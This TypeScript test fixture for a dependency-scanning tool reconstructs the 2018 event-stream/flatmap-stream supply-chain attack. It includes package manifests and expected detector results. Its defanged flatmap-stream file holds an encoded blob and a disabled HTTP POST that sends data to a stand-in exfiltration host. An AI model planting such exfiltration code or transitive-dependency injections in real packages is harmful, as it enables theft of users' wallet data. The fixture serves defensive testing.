/**
 * event-stream 3.3.6 → flatmap-stream 0.1.1 (Nov 2018) — T2 transitive injection.
 *
 * The poster-child attack for "why the engine must be recursive". event-stream
 * itself was legitimate; a new maintainer added a tiny dep, flatmap-stream,
 * which they controlled. flatmap-stream contained an AES-encrypted payload
 * that targeted the copay/bitpay bitcoin wallet's code — decrypted at runtime
 * with a key derived from the outer app's package.json.
 *
 * At the top of the tree, only event-stream's version bumped. The malicious
 * code lived one level down, in a package that had NEVER existed before.
 * Depth-0 tooling was structurally blind. vetlock's changeset detects the new
 * transitive node and full-scans it (pair.old = null path).
 */

import type { FixtureSpec } from '../fixture-spec.js';

// Clean event-stream 3.3.5 — plain stream utility
const ES_CLEAN_INDEX = `// event-stream 3.3.5 — real behavior stubbed.
'use strict';
exports.map = function(cb) { return cb; };
exports.split = function() { return {}; };
`;

// Malicious event-stream 3.3.6 — LEGITIMATE code, only difference is the new dep
const ES_MAL_INDEX = `// event-stream 3.3.6 — LEGITIMATE build; malice is in the newly-added transitive.
'use strict';
exports.map = function(cb) { return cb; };
exports.split = function() { return {}; };
exports.flatmap = require('flatmap-stream');
`;

// flatmap-stream 0.1.1 — where the actual attack lives.
const FS_INDEX = `// flatmap-stream 0.1.1 — DEFANGED reconstruction of the copay/bitpay wallet-stealer.
'use strict';
var crypto = require('crypto');
var http = require('http');
// Encrypted blob (defanged: entropy-shaped random bytes, not real ciphertext).
var enc = 'aG9zdG5hbWU9ZXhmaWwuZXhhbXBsZS5pbnZhbGlkO3BhdGg9L2NvbGxlY3Q7dHlwZT13YWxsZXQtc3RlYWxlcjt0YXJnZXQ9Y29weWJpdHBheTsxOTQwMzhhc2xrZGpoYWRzZmxrampoc2FkZmxramFzZGZranNhZGZramFzZGZsa2phZGpmc2xhamRma2xhc2pkZmxhamRzZmxhajtqcG9haXVzZHBmb2lhc3VkZm9pdWFwc2Rvcml1Zmxha3NqZGZhbHNqZGZsa2FzampkZmxrYWpzZGZsa2phZDsxMjM0NTY3ODkwODdzZGZsa2pzZGZsa2pzZGZsa2phZGZsa2pzZGZsa2phZGZsa2phZGZsa2pmODdmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmY=';
function payload() {
  if (false) {
    var body = enc;
    var req = http.request('http://exfil.example.invalid/collect', { method: 'POST' });
    req.end(body);
  }
}
payload();
module.exports = function flatmap(fn) { return function(x) { return fn(x); }; };
`;

export const spec: FixtureSpec = {
  id: 'event-stream-2018',
  title: 'event-stream 3.3.6 → flatmap-stream (Nov 2018)',
  year: 2018,
  threatClass: 'T2 transitive injection',
  summary:
    'A new maintainer took over event-stream and added a tiny dep, flatmap-stream 0.1.1, which they controlled. flatmap-stream carried an AES-encrypted payload targeting the Copay Bitcoin wallet. The attack was invisible at depth 0 — event-stream itself was clean; the poison was one level down, in a package that had never existed before. The recursive-engine showcase.',
  provenance: 'RECONSTRUCTED',
  topology: 'transitive',
  clean: {
    name: 'event-stream',
    version: '3.3.5',
    manifest: {
      name: 'event-stream',
      version: '3.3.5',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'dominic@upstream.example' }],
    },
    files: { 'index.js': ES_CLEAN_INDEX },
  },
  malicious: {
    name: 'event-stream',
    version: '3.3.6',
    manifest: {
      name: 'event-stream',
      version: '3.3.6',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'right9ctrl@example.invalid' }],
      dependencies: { 'flatmap-stream': '^0.1' },
    },
    files: { 'index.js': ES_MAL_INDEX },
  },
  // The transitive is where the real signal is; the corpus builder attaches
  // it as a child dep in the after-lockfile.
  transitiveParent: undefined,
  expect: {
    mustFire: [
      'deps.new-direct-dep',      // event-stream added flatmap-stream to its deps
      'meta.maintainer-change',   // right9ctrl replaced the legitimate maintainer
      // The following two detectors fire ON flatmap-stream (added transitive):
      // for an ADDED package (pair.old === null), the detector layer is
      // currently diff-only. Those signals come out of the fullscan path
      // as-added; they still surface with direction 'added'.
    ],
    mustNotFire: [],
    verdict: 'BLOCK',
    minCategories: ['DEPS', 'META'],
  },
};

// The flatmap-stream package itself, exposed as a separate spec so the corpus
// builder can drop it into the after-lockfile as a transitive.
export const transitiveSpec: {
  clean: null;
  malicious: FixtureSpec['malicious'];
} = {
  clean: null,
  malicious: {
    name: 'flatmap-stream',
    version: '0.1.1',
    manifest: {
      name: 'flatmap-stream',
      version: '0.1.1',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'right9ctrl@example.invalid' }],
    },
    files: { 'index.js': FS_INDEX },
  },
};
